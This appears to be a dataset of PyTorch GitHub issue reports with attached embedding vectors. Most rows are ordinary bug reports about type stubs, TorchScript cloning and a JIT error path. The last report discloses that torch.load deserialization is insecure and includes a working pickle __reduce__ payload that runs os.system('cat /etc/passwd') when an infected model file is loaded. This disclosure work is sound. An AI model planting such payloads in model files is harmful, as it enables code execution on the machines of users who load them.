  5.22472113e-02 -5.68604022e-02  2.65884995e-01  3.31906676e-01
 -2.96255648e-01 -1.62880704e-01 -1.49536073e-01 -9.21200067e-02
 -1.57198817e-01 -2.94112384e-01 -1.10320508e-01 -3.20345402e-01
  9.07766297e-02  4.06289488e-01 -3.36744368e-01  1.49670988e-01
 -1.78938717e-01  2.41941497e-01  2.98853219e-01  8.45967531e-02
 -4.04026173e-02 -2.14764833e-01  3.59490477e-02 -1.35480911e-02
 -1.93056822e-01  1.78247705e-01  2.46047974e-01 -1.53787732e-01]"
LambdaLR type bug module: optimizer triaged,"## ðŸ› Bug

In `torch/optim/lr_scheduler.pyi`, type of `LambdaLR`'s constructor is

```python
class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: float, last_epoch: int=...) -> None: ...
```

but description of `LambdaLR` in `torch/optim/lr_scheduler.py` is as follow.

```python
class LambdaLR(_LRScheduler):
    """"""Sets the learning rate of each parameter group to the initial lr
    times a given function. When last_epoch=-1, sets initial lr as lr.

    Args:
        optimizer (Optimizer): Wrapped optimizer.
        lr_lambda (function or list): A function which computes a multiplicative
            factor given an integer parameter epoch, or a list of such
            functions, one for each group in optimizer.param_groups.
        last_epoch (int): The index of last epoch. Default: -1.

    Example:
        >>> # Assuming optimizer has two groups.
        >>> lambda1 = lambda epoch: epoch // 30
        >>> lambda2 = lambda epoch: 0.95 ** epoch
        >>> scheduler = LambdaLR(optimizer, lr_lambda=[lambda1, lambda2])
        >>> for epoch in range(100):
        >>>     train(...)
        >>>     validate(...)
        >>>     scheduler.step()
    """"""
```

I think type of `LambdaLR` should be as follow.

```python
LRLambdaType = Callable[[int], float]

class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: Union[LRLambdaType, List[LRLambdaType]], last_epoch: int=...) -> None: ...
```


cc @vincentqb",True,"[-2.70977437e-01 -4.63768423e-01 -1.35541245e-01  1.08330455e-02
  1.94602758e-01 -1.84080303e-01  5.68434484e-02  1.88656151e-01
 -2.83927411e-01 -8.85458663e-04 -8.15917253e-02 -1.22278273e-01
  1.57905370e-01  4.95240055e-02  3.63854289e-01  4.67134476e-01
  1.03744492e-01 -2.75609851e-01 -2.51266509e-01 -9.73035246e-02
  8.21448416e-02  1.53884634e-01 -1.51888579e-01  2.87981808e-01
 -4.67129797e-02 -1.43797189e-01 -1.77767545e-01 -1.94416493e-01
  1.43625647e-01  2.62972265e-01  6.01046160e-02 -2.66976267e-01
 -4.11045492e-01  1.18170589e-01  1.12414382e-01  1.14170536e-01
 -2.66235948e-01 -4.54272181e-02 -8.13106298e-02  5.93954697e-03
  1.66583173e-02  6.64005727e-02 -1.80549882e-02 -6.42582681e-03
 -1.52352542e-01  2.92592496e-03 -3.05079550e-01  1.60082415e-01
 -5.90663552e-01  2.44738888e-02 -8.39930177e-02  1.19432881e-01
 -2.43679583e-01 -3.31831455e-01  1.05115145e-01  7.35391676e-02
 -1.36845022e-01  3.67704555e-02  1.84981495e-01 -2.49194372e-02
 -4.53868136e-03  1.53296575e-01  9.43793729e-02  1.29708707e-01
 -3.58576447e-01  2.54221499e-01  1.78557530e-01  1.03533775e-01
  4.90780115e-01  8.64846073e-03  4.69670631e-03 -2.40612596e-01
 -4.51104850e-01 -8.25121477e-02 -2.43845992e-02 -2.99522012e-01
 -3.88761222e-01  2.36804947e-01 -2.90180862e-01  2.52048280e-02
 -1.26156405e-01  4.12711538e-02 -1.74184795e-02  1.81863055e-01
  2.52268791e-01 -1.74383119e-01  2.44032502e-01 -2.06932887e-01
  3.34504306e-01  3.78776103e-01  2.26894021e-01 -2.88773596e-01
  2.75997706e-02  4.70633686e-01 -1.74116403e-01  1.66788757e-01
  3.85812610e-01 -1.97142243e-01 -2.61565447e-01 -2.53663898e-01
 -5.78080900e-02 -4.14399743e-01 -1.95188671e-01  3.91563892e-01
  8.73634592e-02 -1.45238817e-01  1.54982641e-01  1.82554856e-01
  7.54463151e-02 -1.88505575e-01  2.63338298e-01 -1.41652048e-01
  2.48556450e-01 -3.66331637e-01  1.41305447e-01  5.74494079e-02
 -5.01182675e-01 -9.16255489e-02  4.87801656e-02  4.24075752e-01
  2.27220207e-01  3.84591401e-01  3.35581899e-01  4.93806303e-01
  5.03404737e-01 -2.25942079e-02  2.30916560e-01 -1.88271523e-01
 -1.08734056e-01 -3.40423226e-01  1.23068765e-01  2.31646091e-01
 -1.47544771e-01  1.27611861e-01  3.80813420e-01  3.11002463e-01
 -9.70546678e-02 -3.93740892e-01  2.73020297e-01 -2.82656580e-01
 -5.14081955e-01  1.23518303e-01 -7.24932626e-02 -3.61983597e-01
  2.53367573e-01  3.46381992e-01 -1.60304919e-01  1.06370717e-01
 -2.75184922e-02 -1.44693822e-01  1.32000178e-01  1.17085055e-01
 -3.70363951e-01  2.95069307e-01  2.61437416e-01  2.95412242e-01
  5.26364744e-01  8.30744356e-02  5.05580425e-01 -3.18119437e-01
  8.64851177e-02  5.53217411e-01  1.47930175e-01  2.22537909e-02
 -2.86444277e-01  7.01393485e-02 -3.05962443e-01  1.11748930e-02
 -5.10694146e-01  3.08533043e-01 -1.38416693e-01 -3.10124874e-01
 -1.75456792e-01 -8.66899341e-02  2.57871952e-03  1.24785610e-01
  3.00453976e-02 -5.27830482e-01  1.40095577e-01  4.08812135e-01
  4.64283317e-01  9.06047761e-01  1.83821127e-01  2.07753092e-01
  1.88880730e-02  5.54156750e-02  1.65163115e-01  1.00511022e-01
  5.74569404e-02 -5.96062839e-03 -1.85543865e-01 -3.65057528e-01
  4.27291572e-01  7.30081499e-02 -3.34765352e-02 -8.13793018e-03
  4.84284878e-01 -9.78482738e-02  3.04414868e-01 -8.61373246e-02
 -3.39773744e-02  2.66213268e-01  2.96837650e-02 -8.10290724e-02
 -4.08458523e-02 -6.55454099e-02 -4.62156653e-01 -2.34849393e-01
  6.23873025e-02 -5.57386018e-02 -2.21297711e-01 -3.51183534e-01
  1.57328740e-01 -3.88570547e-01 -1.49574429e-01  1.34121284e-01
 -1.17989257e-02 -3.43726240e-02 -1.58839095e-02 -1.70573533e-01
  8.88783857e-02  2.04253986e-01 -8.48506168e-02 -2.99087018e-01
  2.16486946e-01 -2.64856130e-01 -2.04285011e-02  1.36116698e-01
  1.69561580e-01 -1.32573679e-01 -1.56175539e-01 -2.16313779e-01
  8.52567889e-03  1.10115230e-01 -5.58778718e-02  5.39993979e-02
 -1.19573787e-01 -3.71734053e-02 -1.81687996e-02  9.92327183e-02
  6.38057515e-02 -2.16888249e-01  8.76942426e-02  6.07401431e-02
  2.43593752e-01 -1.44479796e-01 -3.41083288e-01 -1.61723226e-01
 -1.71375170e-01  1.84056193e-01 -3.67311239e-01  2.64495671e-01
  2.90110230e-01 -3.50645125e-01  1.54991418e-01  4.24553186e-01
  5.03230728e-02 -3.14700842e-01 -1.17690817e-01 -2.11773098e-01
 -1.81420475e-01  4.91699994e-01  6.34488538e-02  1.18546560e-01
  1.80500880e-01 -2.12086797e-01 -2.55438864e-01 -1.34882882e-01
  3.92514020e-01  2.72183478e-01  7.57957026e-02 -5.73385119e-01
  4.13970441e-01  2.95260213e-02  3.26049268e-01 -1.66575462e-01
  4.88220304e-01  1.68891862e-01  2.21786648e-01 -3.04675519e-01
  1.98408067e-01  2.14964122e-01  2.87653543e-02 -5.90087622e-02
  1.84727415e-01 -2.14960217e-01  8.74119103e-02  1.04722947e-01
 -5.88474870e-01  1.77824199e-01 -1.67411327e-01 -1.19326878e-02
  2.03725889e-01 -4.57886279e-01 -3.78539324e-01  3.07565212e-01
  2.83889025e-02 -2.97630936e-01 -4.11734805e-02 -1.82288647e-01
  2.98052430e-02 -7.65399411e-02  2.13241369e-01 -2.42913187e-01
 -1.74749926e-01 -1.08204037e-01  4.54511583e-01  4.40880544e-02
  9.46138278e-02 -5.83313107e-01  7.99264386e-02  2.45275855e-01
 -2.83496410e-01  2.21826524e-01 -8.49615782e-02  3.04193310e-02
 -6.77479506e-02  4.19451416e-01  1.47417545e-01 -1.39241785e-01
 -2.42109269e-01 -2.96972096e-01 -2.91121960e-01 -1.10761456e-01
  3.22919711e-02  2.34725803e-01 -2.37191767e-01  6.28964156e-02
 -2.47198358e-01 -1.40307605e-01  2.06328303e-01  2.64681637e-01
  3.55403274e-02  2.91369170e-01 -1.60027117e-01 -2.93566823e-01
 -2.40492627e-01  1.62714615e-01  1.77065916e-02 -4.65298027e-01
 -6.80748280e-03 -7.89204091e-02  1.93622589e-01 -5.42770028e-01
 -2.86375403e-01 -5.68321571e-02 -7.84990937e-02  5.05606174e-01
 -1.24780424e-02  1.07996557e-02 -2.36435369e-01  2.06167504e-01
 -1.08486041e-01 -2.23810256e-01  2.55537450e-01  4.33148295e-01
  2.52407134e-01 -8.59075934e-02  4.49386626e-01  3.64619374e-01
 -1.77277997e-01  3.22885692e-01 -5.14038324e-01 -2.20917091e-01
  4.28348035e-01 -3.11286539e-01  3.96391712e-02  7.86210746e-02
 -1.45425405e-02  2.38830328e-01 -4.16358322e-01  6.99165016e-02
 -1.42015174e-01  6.31464571e-02  2.87405159e-02  1.02925628e-01
  9.36746001e-02 -2.69670129e-01  2.87687238e-02 -4.47585853e-03
  2.01606333e-01 -6.56924471e-02  8.79659280e-02  2.17360407e-02]"
torch::jit::script::Module::clone() is not actually cloning parameters high priority triage review oncall: jit triaged,"## ðŸ› Bug

If you take a look at the highlighted section: https://github.com/pytorch/pytorch/blob/4314620ba05bc1867f6a63455c4ac77fdfb1018d/torch/csrc/jit/script/module.cpp#L191-L203, you would notice that when `IValue s` is not a module, `Module r` will simply register it. Therefore, the new module will share the same parameters.

## To Reproduce

Steps to reproduce the behavior:

1. Load any TorchScript model `model`
2. Run `clone = model.clone()`
3. Find any parameter in `model` and that same parameter in `clone`, `isAliasOf` will evaluate to `true`

## Expected behavior

Expect `clone()` to deep copy  everything in a TorchScript model.

## Environment

N/A

## Additional context

N/A


cc @ezyang @gchanan @zou3519 @suo",True,"[-7.53470063e-01 -2.61293232e-01 -7.69997314e-02 -1.47058055e-01
  8.56328011e-02 -3.62059653e-01 -1.27278954e-01  2.69801795e-01
 -2.53181815e-01 -2.87092626e-01  1.27408013e-01 -5.21790311e-02
 -3.25023711e-01 -5.60519546e-02  9.41346213e-03  2.55583450e-02
 -2.36593708e-01 -2.21877843e-01 -1.50592729e-01 -1.53951168e-01
 -1.68261200e-01 -2.48021901e-01 -3.06711495e-01 -8.95177722e-02
 -5.97464154e-03  7.78532773e-02  6.43170923e-02  1.16591379e-01
 -1.20900892e-01  1.33931458e-01  1.47503108e-01  5.28535128e-01
 -4.41471815e-01 -2.87536204e-01  3.04616272e-01  4.10761386e-02
 -2.17465311e-01 -8.35304633e-02 -1.03373211e-02 -3.60034794e-01
  3.82389754e-01 -1.38288662e-02  1.03385337e-01 -5.08841462e-02
  6.15336001e-02 -1.11414790e-01 -1.39727443e-01  5.32184951e-02
 -3.18516105e-01 -3.10125619e-01 -1.88539132e-01 -1.12079546e-01
  5.29337153e-02  5.96146546e-02  3.42769437e-02 -1.82209790e-01
  2.55034208e-01 -1.44132093e-01  3.72540146e-01 -9.77871269e-02
 -4.38816510e-02  1.67052671e-02  6.19667023e-02  7.38306344e-02
  9.80490446e-02  4.98088151e-02  1.32882059e-01 -1.26747087e-01
  4.24363077e-01  3.91913831e-01 -1.18462950e-01 -1.71013981e-01
  2.07922488e-01 -1.88957989e-01  1.19450599e-01 -5.35108298e-02
 -1.75749004e-01  9.93379951e-02  1.21533886e-01 -4.12838936e-01
  8.79353806e-02 -3.05387676e-01  6.98620975e-02 -1.99446589e-01
 -1.08522311e-01  1.74197450e-01  1.13614917e-01  1.22112349e-01
  7.07843155e-02 -1.84799120e-01  5.30416109e-02  2.02438712e-01
  5.02778828e-01  4.18465197e-01 -2.37052381e-01  2.34765157e-01
  1.61178201e-01 -1.95301354e-01 -5.61068535e-01 -2.46961117e-01
 -1.49962455e-01 -3.64567012e-01 -7.33054653e-02  1.45975202e-01
  9.00599733e-03 -2.86284983e-01  4.03378844e-01  1.32783920e-01
  2.30854169e-01 -2.03213722e-01  1.07327059e-01  3.94046575e-01
 -2.34004706e-01 -2.20823944e-01  3.72153103e-01 -2.08396733e-01
  6.48039673e-03 -1.33499056e-01 -2.00833157e-01  1.29593059e-01
 -3.02451830e-02  2.65727025e-02 -1.44311011e-01  9.14072916e-02
  3.18011165e-01  1.13079056e-01  6.44032434e-02  1.83506146e-01
  1.02409318e-01  4.21995878e-01 -2.29692355e-01  1.19179249e-01
  1.69497356e-02  1.29345329e-02  2.05665439e-01  2.56829619e-01
 -4.49736953e-01 -1.45419791e-01 -4.52539474e-02 -3.89827490e-01
 -7.69287646e-02  2.18795508e-01  2.23870099e-01 -4.39669192e-02
  1.18172187e-02 -1.78156942e-01 -6.22741207e-02 -1.89840689e-01
 -2.58922577e-01  1.25145279e-02 -2.54459471e-01 -1.95668697e-01
 -5.66877164e-02  5.76445878e-01  2.65469730e-01  9.93901305e-03
  6.02262504e-02  1.41434282e-01  3.12584460e-01 -1.30843848e-01
  3.67593914e-02  3.13832402e-01 -4.47430536e-02  1.82429865e-01
  2.13598430e-01 -3.77074838e-01 -4.00612295e-01  1.09671146e-01
 -3.02743077e-01  1.79861546e-01 -5.12393355e-01 -2.43753552e-01
 -1.08889021e-01 -2.07018942e-01 -3.37659299e-01 -1.94433451e-01
  4.18871641e-05  5.16524576e-02 -1.21818215e-01  1.87842697e-01
  3.30965459e-01  3.39366496e-01  3.80417913e-01  2.20465720e-01
  2.02927440e-02  8.33390206e-02  3.44661087e-01  1.23503588e-01
  2.30968241e-02 -5.94213665e-01 -7.33693898e-01  4.55669373e-01
  2.21408367e-01 -2.23268103e-02  1.05347201e-01  6.56036660e-03
 -9.14840028e-03  4.03389633e-02 -2.50724703e-01 -3.01143169e-01
 -1.00330226e-01  4.67385530e-01 -1.52401045e-01 -2.61901915e-01
  2.20429286e-01  3.10647786e-01 -2.21872389e-01 -1.59286320e-01
 -1.25114962e-01 -1.01740845e-02 -1.12235826e-02 -5.29116802e-02
 -2.04751462e-01 -1.79631144e-01 -2.91945995e-03  5.86033642e-01
 -6.86939210e-02  2.44867027e-01  2.17342958e-01  3.02417755e-01
  3.21918011e-01  1.46391373e-02 -6.01532385e-02 -3.69738996e-01
 -2.15327948e-01  1.51980847e-01  2.66181119e-03  8.30654055e-02
 -5.29877730e-02 -1.03567012e-01 -1.53535545e-01 -2.98054993e-01
  5.42569339e-01  6.18157424e-02 -9.63979810e-02  2.05968261e-01
  7.28101842e-03 -3.31407011e-01 -6.54599350e-03  2.32910976e-01
 -1.32379502e-01 -3.70404482e-01  2.59167142e-03  5.90906851e-02
  6.65692240e-02  1.74495265e-01 -2.93655932e-01  4.85933200e-02
  4.97915298e-02  2.54684359e-01 -1.09749280e-01 -2.03342944e-01
 -1.56825259e-01 -3.19090486e-02  1.62325099e-01 -1.12208948e-01
  9.37125981e-02  2.74939276e-03  1.36440564e-02 -2.83459425e-01
  6.13685966e-01  3.68360162e-01 -7.52306655e-02  4.51688245e-02
  7.74814337e-02  1.87737331e-01 -2.69173265e-01  1.78147316e-01
 -1.74825221e-01 -7.53774643e-02  5.96626043e-01 -2.63263166e-01
  1.99275345e-01  5.39556384e-01  2.05125153e-01 -8.17723274e-02
  3.64167571e-01 -3.78050804e-02 -2.94351816e-01 -5.93304913e-03
  4.27385956e-01  1.08835518e-01  2.71445781e-01  1.03606664e-01
  5.99421203e-01 -3.14215809e-01 -2.36889832e-02 -3.11045945e-01
 -2.17948198e-01 -2.07930624e-01  1.71606630e-01  4.46807258e-02
  6.42416716e-01 -7.06023443e-03 -8.58981386e-02 -3.62791382e-02
  1.04313061e-01 -3.19249136e-03  2.57933825e-01  1.63259842e-02
 -6.00855887e-01 -1.71539694e-01  9.37973782e-02 -6.97866976e-02
 -2.07442105e-01 -1.07641080e-02 -2.70118415e-01  7.72913843e-02
  1.92408323e-01 -4.67070669e-01  3.36016953e-01  1.68776214e-01
  1.09838374e-01 -3.48880589e-01 -2.77998269e-01  9.90786850e-02
 -3.01800191e-01  4.31284010e-01  7.63388723e-02  6.91815913e-02
  3.54781628e-01 -3.63631621e-02 -4.32807773e-01  1.02863789e-01
  1.23918988e-01  3.33523363e-01 -3.82672548e-01  2.99744997e-02
  1.81811392e-01  1.09262139e-01  1.00374751e-01 -4.42549679e-03
 -4.33833599e-02  2.49199271e-01 -2.93543875e-01 -1.09055057e-01
  1.55865178e-02  2.02531278e-01 -4.35269363e-02 -3.42582494e-01
 -2.81226307e-01  1.14279032e-01  3.53327751e-01 -1.00205794e-01
 -2.36574546e-01 -1.05468258e-01  1.43720582e-01  3.47163260e-01
  1.26036197e-01 -1.02443680e-01 -3.68989110e-01  3.97160016e-02
 -1.67528093e-01  1.47955418e-01 -1.02218561e-01  4.18907136e-01
 -1.31228566e-01  2.90069759e-01  6.17746592e-01  4.31309879e-01
  2.77116261e-02 -1.33231804e-01 -2.26157427e-01  2.93169200e-01
  1.01003900e-01 -8.16925429e-04  1.38722658e-01 -4.75179493e-01
 -1.29182681e-01 -1.04949482e-01 -1.67525470e-01 -1.21303447e-01
  2.81330049e-01 -1.37310009e-02  1.42451078e-01 -2.31797189e-01
  2.47391418e-01  1.10534683e-01  4.28168103e-02  4.81613427e-02
  2.11418003e-01  3.11079621e-03  3.12800035e-02  1.64067850e-01]"
python error UnboundLocalError in jit/frontend.py oncall: jit triaged,"## ðŸ› Bug

One of the error cases in the function ```build_param_list``` uses ```ctx_range``` without defining it, in the following context:
```
    if not PY2 and py_args.kw_defaults:
        raise NotSupportedError(ctx_range, _vararg_kwarg_err)
```
## To Reproduce

Steps to reproduce the behavior:

I was using ```torch.jit.script()``` on a large module, and since it's the error reporting that's failing I don't have a line reference. By inspection, however, I believe the unsupported feature was the asterisk in the following function definition:
```
    @torch.jit.export
    def initState(self, *, n_tokens: int, device_name: str) -> None:
```

## Expected behavior

Relevant error message should be reported.

cc @suo",True,"[-2.54659534e-01 -4.63722259e-01 -1.24571182e-01  4.69169989e-02
  5.43852150e-02 -2.19922960e-01  3.81204307e-01  3.32261622e-02
 -3.60397696e-01 -6.04957268e-02  3.06437224e-01  5.52986935e-03
  1.71250492e-01  1.99747771e-01  2.07391426e-01  2.49596789e-01
 -1.77126691e-01 -4.41516906e-01 -1.92749381e-01 -2.84645371e-02
  4.73967195e-01 -3.45708877e-02 -1.97913051e-01  4.16074414e-03
 -2.10834399e-01 -1.01104073e-01 -1.22674391e-01  1.80141814e-02
  2.27711931e-01  2.62468398e-01  6.50301576e-02  4.71042693e-01
 -4.58370209e-01 -3.67234498e-02  1.51212826e-01  2.44174764e-01
 -2.10062772e-01 -1.57225147e-01 -9.13641881e-03  6.24649450e-02
 -1.62906811e-01  3.35962251e-02  1.46933526e-01 -1.47639498e-01
 -9.54994261e-02 -3.13528687e-01 -5.14542051e-02  2.37345546e-01
 -2.54501343e-01 -1.74926236e-01 -9.65547562e-02  2.58674413e-01
 -1.63960397e-01 -3.11383247e-01  1.68012738e-01  8.12876225e-02
 -7.35543966e-02  2.56384283e-01 -1.81818873e-01 -2.18713522e-01
 -2.96867080e-02  3.94960269e-02 -9.70065817e-02  1.30300462e-01
 -2.52827793e-01  2.58372366e-01 -1.20256096e-04  1.09857023e-01
  4.89400119e-01  3.30565199e-02 -1.29221864e-02  2.17637345e-01
 -1.55740470e-01  5.66524826e-02  1.00542635e-01  8.58680457e-02
 -2.21131057e-01  2.63781548e-02 -6.97954148e-02 -2.08051354e-01
  2.45901179e-02 -8.50927383e-02  4.33437899e-02 -1.63237616e-01
  2.03353316e-01 -1.56927019e-01 -4.41492721e-02 -1.30160868e-01
  1.81355774e-01  1.55229419e-01  3.96955192e-01 -9.69495624e-02
 -3.87191862e-01  4.37198848e-01 -1.71896577e-01  2.39921063e-01
  1.24269910e-01 -2.20318303e-01 -2.75105536e-01 -2.41998821e-01
  7.47475773e-02 -1.25837252e-01 -1.64489925e-01  4.83685791e-01
  1.58484384e-01  5.87787926e-02  2.42772266e-01  5.44419922e-02
  2.34849483e-01 -1.25661016e-01 -1.01591386e-01 -5.84998652e-02
  1.31928757e-01 -1.46751404e-01  1.47453815e-01  1.32334605e-01
  4.42958847e-02  5.13254069e-02  8.08109492e-02 -3.81260626e-02
  4.22640964e-02  1.60824418e-01 -2.75260191e-02  1.52172312e-01
  1.94653928e-01  1.98482394e-01  2.68804003e-02 -5.64264655e-02
  1.03350788e-01 -1.85255498e-01  3.46833855e-01 -1.64996684e-02
 -1.30362630e-01  7.96331652e-03  3.30095857e-01 -2.12311208e-01
 -1.85522452e-01  1.02563210e-01  3.84415593e-03 -6.68454766e-02
 -8.31089318e-02 -3.80703807e-01  1.35666221e-01 -2.07429454e-01
  2.11966932e-01  2.31099367e-01 -2.61360109e-01  2.39725739e-01
 -6.12236857e-02 -2.68389851e-01 -2.11532861e-01  2.21830696e-01
 -3.73857379e-01  4.34200644e-01 -1.82478622e-01  3.77776831e-01
  2.13144302e-01 -5.54548874e-02  2.90554047e-01 -1.38869390e-01
 -8.64958763e-03  3.21691602e-01 -1.48770362e-01 -3.18370640e-01
  6.52407389e-03  7.32949972e-02 -1.15264125e-01  4.86261472e-02
 -2.32448712e-01 -1.26284927e-01 -3.99932824e-02 -1.51616707e-02
 -2.46436089e-01 -4.65041041e-01  1.03680566e-01  1.72651619e-01
 -3.52018863e-01 -4.56074119e-01  9.86546576e-02  3.38575333e-01
  2.36117601e-01  4.02180076e-01  4.74836156e-02  1.41235709e-01
 -1.58990711e-01 -2.57184654e-02  1.08929843e-01  3.81570170e-03
  1.15817085e-01 -1.84194893e-01 -2.25475937e-01 -1.40689090e-01
  3.20491344e-01 -4.04857956e-02  6.61056861e-02 -2.56193846e-01
  1.31759182e-01 -6.58617169e-03  4.92336303e-02  1.93670206e-02
 -1.10260658e-01 -2.11824849e-03  3.22395861e-01 -7.96666294e-02
  1.47302911e-01 -1.18603967e-01 -7.01453090e-02 -1.82042539e-01
  1.70264244e-01  9.39592719e-02 -3.33382666e-01 -3.02925825e-01
  6.83268309e-02 -2.32980579e-01 -9.26498473e-02  2.86833167e-01
  3.20991486e-01 -4.50175032e-02  1.16694644e-02 -1.52366355e-01
  4.17750105e-02 -4.75582555e-02  5.51977269e-02 -2.73861796e-01
  2.47297153e-01  4.45621252e-01 -1.00578368e-01 -1.49535537e-01
  1.10752374e-01 -6.83559384e-03  2.63739288e-01 -2.47847319e-01
  5.45170546e-01 -3.06166224e-02 -3.83396484e-02  2.28217304e-01
  7.68456161e-02  1.05083205e-01  1.66275889e-01  5.59295595e-01
 -4.62421000e-01 -1.32435262e-02  4.58393618e-03 -3.03419270e-02
  4.76049781e-02 -3.84940445e-01 -3.06057572e-01 -3.34627748e-01
 -4.93509859e-01 -1.40553080e-02 -3.87973845e-01 -3.10095586e-03
  1.12583213e-01  1.08651400e-01  2.93929100e-01  5.55351377e-02
  7.49588162e-02  2.83968206e-02 -1.60043150e-01 -1.03250831e-01
 -1.41518056e-01 -5.58959730e-02  8.26919079e-02  2.29082987e-01
 -5.73878959e-02 -2.42037788e-01 -1.43318504e-01  2.25483015e-01
  1.87143326e-01 -1.25522643e-01  1.40900940e-01 -3.75814319e-01
  2.05020413e-01 -6.08026795e-02  1.42610565e-01  1.93277806e-01
  3.15572739e-01 -5.76845109e-02  4.45481129e-02 -1.66457996e-01
 -1.80682838e-01  1.74774855e-01 -2.80347824e-01  9.47161764e-03
  3.78457487e-01 -1.43779874e-01 -2.85490602e-01  3.18314917e-02
 -3.37410539e-01 -4.26603630e-02 -1.21999405e-01  1.66481987e-01
  4.39718962e-01 -2.34264389e-01  4.44903560e-02  1.80412605e-01
 -1.69615969e-01 -2.64504015e-01 -6.81639463e-02 -9.98718850e-03
 -1.69205278e-01  7.66652673e-02  1.26398444e-01  1.54084370e-01
 -5.76792099e-02  5.30504733e-02  3.15487683e-01 -1.23134255e-01
 -2.11203732e-02 -2.23762572e-01  3.82225692e-01  5.94753444e-01
  1.08181136e-02  1.91878483e-01 -1.98819846e-01 -1.12965330e-02
  7.68750608e-02  5.88480830e-01  3.65765095e-01  2.32249051e-01
 -3.79771411e-01 -4.14919436e-01 -4.98307943e-01 -5.05942740e-02
  7.24411607e-02  1.18189715e-01 -1.52356192e-01 -3.52383256e-02
 -7.35710859e-02 -1.39492005e-01  2.46655345e-02  2.36361131e-01
 -1.73933625e-01  9.93395895e-02  2.13613063e-01 -1.63603485e-01
 -1.57391280e-01  1.22981824e-01 -7.21639022e-03  4.73813787e-02
 -3.40810269e-02 -3.53467241e-02  9.45563987e-03 -3.12094629e-01
 -1.10261627e-01 -1.37654513e-01 -4.84717414e-02  4.08166766e-01
 -1.37467727e-01  1.14969701e-01  1.77252993e-01 -1.17096126e-01
 -3.38295460e-01 -3.78368720e-02 -8.07687938e-02  4.78690803e-01
  1.33059829e-01  1.05929747e-02  4.49206978e-02  2.21990079e-01
 -3.31940889e-01 -1.58387929e-01 -1.29464775e-01  1.86235178e-04
  1.04459338e-01 -2.79517770e-02 -2.11586908e-01 -3.09797347e-01
  1.49688885e-01 -8.24300721e-02 -3.74561816e-01  7.21742511e-02
 -2.86713392e-01  2.23503888e-01  8.22428241e-02  1.66449592e-01
 -1.13412060e-01  3.58151734e-01  1.09123789e-01 -1.50759548e-01
 -2.26834416e-01  4.74656641e-01  7.79272988e-03  2.21936144e-02]"
Third party PyTorch models may execute arbitrary code during deserialization high priority module: docs module: serialization triaged,"## ðŸ“š Documentation

PyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.
It concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))

### Example script, that infects any existing model:

```python
import torch
import pickle

ON_REDUCE = """"""
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat /etc/passwd')
""""""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('inception_v3_google-1a9a5a14.pth')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'evil.pth')
```

Then, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.

### Small demo:
![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)

### Proposed solution
As an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models

cc @ezyang @gchanan @zou3519",True,"[-1.43984288e-01 -3.25121522e-01 -5.04705369e-01 -2.69145101e-01
 -3.18775326e-03  4.13916111e-02 -1.70079157e-01 -2.36363173e-01
 -1.70136377e-01 -4.92748916e-02  1.21869117e-01 -3.33819576e-02
  5.71001992e-02  2.27434263e-02  1.57449752e-01 -1.03843048e-01
 -4.67517897e-02  7.71075636e-02 -1.48236841e-01  2.40487635e-01
  3.43123116e-02 -6.49781600e-02 -1.26791090e-01 -5.02088666e-02
 -3.66186276e-02  1.54767111e-02 -3.72724943e-02 -2.44594187e-01
  1.76776014e-03  3.06949280e-02  1.74324475e-02  4.03659344e-01
  1.89635515e-01 -1.35190219e-01  5.79505041e-02  1.99433044e-02
 -2.58253336e-01 -2.11817712e-01 -8.04070905e-02 -3.08335088e-02
 -7.01767504e-02  1.89823583e-01 -2.57010281e-01  1.23335443e-01
 -5.86700082e-01 -8.74219835e-02 -1.51461944e-01  2.84507424e-01
 -4.23101813e-01 -1.10770144e-01 -1.56082474e-02  6.19021468e-02
 -2.89583743e-01 -1.82663918e-01  4.28399676e-03 -1.66924432e-01
  1.65747643e-01 -3.83501463e-02 -2.03122288e-01 -4.00138125e-02
  5.03912196e-02 -1.02885440e-03 -3.51151824e-02  8.73977244e-02
  1.31009519e-02  5.74740767e-01 -7.96125233e-02 -4.69278321e-02
  3.80564630e-01 -3.09648454e-01 -1.51979774e-01 -1.27527509e-02
 -3.46547484e-01 -1.29342392e-01  2.66928598e-03  2.33813047e-01
 -5.15798777e-02  1.53811842e-01  1.14982277e-01 -1.96581945e-01
 -5.69633171e-02 -1.30892992e-01  2.25521624e-04  6.48748577e-02
  1.65125653e-02 -9.36126038e-02  1.24328695e-01  1.55151188e-01
  9.63473767e-02 -5.99603504e-02  4.24064666e-01 -1.53830294e-02
  1.49362251e-01  2.57743239e-01 -3.72017547e-02  6.34177387e-01
 -2.09245443e-01 -1.08983517e-01 -3.17954980e-02 -2.25491568e-01
 -6.86545670e-02 -1.21314198e-01 -1.43031925e-01  3.50206703e-01
  1.29852712e-01 -3.24995935e-01  1.68690197e-02 -7.92753994e-02
  4.69607711e-02 -1.65868700e-02 -9.81864259e-02 -1.00000845e-02
  2.48784095e-01  1.30094495e-02 -7.51918033e-02  2.32227087e-01
  1.60636663e-01  1.64321154e-01  2.59615123e-01 -7.20635056e-02
  2.70287693e-01  2.26793364e-02  1.35413632e-01  6.10325970e-02
  3.85768354e-01  9.93658155e-02 -3.22620779e-01  1.67990804e-01
 -3.11575048e-02 -2.01144829e-01  3.37632895e-01 -8.85232538e-02
  4.36076336e-02 -2.91632302e-02  1.52311057e-01 -2.29019046e-01
 -2.26647660e-01 -2.10522175e-01 -1.28227323e-01 -1.51373714e-01
 -1.77422971e-01  1.25669479e-01  1.47531301e-01  9.55434330e-03
 -1.43530622e-01  4.31820571e-01 -6.73007965e-02  3.25079679e-01
  1.36767745e-01  2.75664687e-01 -3.04029025e-02  1.81141738e-02
 -1.66221589e-01  4.28358316e-01  7.73461759e-02  5.55378012e-03
